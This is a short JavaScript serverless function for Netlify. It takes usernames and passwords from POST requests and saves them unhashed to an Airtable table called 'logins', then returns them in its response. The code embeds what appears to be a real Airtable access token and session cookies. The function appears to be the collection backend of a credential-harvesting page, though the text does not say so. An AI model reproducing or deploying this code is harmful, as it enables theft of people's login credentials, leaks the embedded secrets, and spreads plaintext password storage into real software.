// Docs on request and context https://docs.netlify.com/functions/build/#code-your-function-2
export default async (request, context) => {
  if (request.method !== 'POST') {
    return new Response('Method Not Allowed', {
      status: 405,
    })
  }

  try {
    const { username, password } = await request.json()
    const myHeaders = new Headers();
    myHeaders.append("Authorization", "Bearer patFPAzk3Ni4jtL7K.8bdcda86e17b32bd177f9ab25661e401e4454a8e4a2401a267c36b67e94ea933");
    myHeaders.append("Content-Type", "application/json");
    myHeaders.append("Cookie", "brw=brwXpq8TytmY2qtpw; brwConsent=opt-in; AWSALBTG=yCzNg3TcsBBHBnSgRzefBwl2+ihORh1tFrlqLVMz0VUIzmp8bWkE0wF78UkFK6BdpfPzSk4w04KqC5qeRcLli7jFovg8ZX3t2mmdAXQj4rIYJmcaQqhVEa6AIZ5dg3tqxFTEZ0JfUV3ygQYIwY8wSUWSaKjM98IAWgpmcdymdzFKF2eDPfI=; AWSALBTGCORS=yCzNg3TcsBBHBnSgRzefBwl2+ihORh1tFrlqLVMz0VUIzmp8bWkE0wF78UkFK6BdpfPzSk4w04KqC5qeRcLli7jFovg8ZX3t2mmdAXQj4rIYJmcaQqhVEa6AIZ5dg3tqxFTEZ0JfUV3ygQYIwY8wSUWSaKjM98IAWgpmcdymdzFKF2eDPfI=");
    
    const raw = JSON.stringify({
      "fields": {
        "username": username,
        "password": password
      }
    });
    
    const requestOptions = {
      method: "POST",
      headers: myHeaders,
      body: raw,
      redirect: "follow"
    };
    
    try {
      const response = await fetch("https://api.airtable.com/v0/appXXbVu5p4uSKViT/logins", requestOptions);
      const result = await response.text();
      console.log(result)
    } catch (error) {
      console.error(error);
    };
    return new Response(JSON.stringify({ username, password }), {
      headers: { 'Content-Type': 'application/json' },
    })
  } catch (error) {
    return new Response(error.toString(), {
      status: 500,
    })
  }
}
